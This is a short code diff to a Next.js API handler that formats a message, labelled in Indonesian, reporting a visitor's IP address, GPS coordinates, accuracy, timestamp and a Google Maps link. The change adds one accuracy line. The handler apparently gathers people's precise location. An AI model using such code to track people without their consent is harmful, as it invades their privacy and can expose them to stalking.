@@ -24,6 +24,7 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
 🌐 *IP:* ${ip}
 📍 *Lokasi:* ${lat}, ${lon} (±${acc}m)
 🕒 *Waktu:* ${timestamp}
+🗿 *akurasi:* ${acc} meter
 
 [📍 Google Maps](${mapUrl})
 `;
